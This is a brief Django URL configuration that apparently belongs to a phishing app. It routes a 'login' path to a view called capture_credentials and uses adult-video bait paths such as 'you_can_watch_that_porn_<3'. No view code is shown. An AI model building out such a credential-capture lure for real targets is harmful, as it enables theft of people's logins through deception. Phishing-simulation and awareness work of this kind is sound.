from django.urls import path
from . import views

urlpatterns = [
    path("login", views.capture_credentials, name = "capture_credentials"),
    path("", views.play_video, name = "play_video"),
    path("you_can_watch_that_porn_<3", views.continue_watching, name = "continue_watching"),

]
